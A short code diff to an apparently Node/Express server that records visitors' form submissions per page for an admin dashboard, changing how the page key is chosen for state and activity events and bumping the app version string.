@@ -390,14 +390,22 @@ function recordSubmission(type, payload) {
     set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
-    set("page", ["page", "currentPage", "step"]);
+    set("page", ["page", "currentPage", "step", "page_path"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
     // Per-page bucket: keep the latest client inputs grouped by the page/event
     // the visitor was on when they submitted, so the dashboard can show
     // exactly what the client typed on each screen of their session.
     const existingUser = db.get().users[id] || {};
-    const pageKey = String(flat.page || type || "unknown");
+    // State/activity markers must not erase the meaningful page where the
+    // visitor submitted the form. Prefer an explicit route, otherwise keep
+    // the last known route for marker-only events.
+    const pageKey = String(
+      flat.page ||
+      payload?.page_path ||
+      (type === "state" || type === "activity" ? existingUser.lastPage : type) ||
+      "unknown"
+    );
     const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
     const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
     const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
@@ -627,7 +635,7 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   });
 });
 
-const APP_VERSION = "v24-all-pages-contract";
+const APP_VERSION = "v25-page-history-contract";
 
 app.get("/version", (_req, res) =>
   res.json({
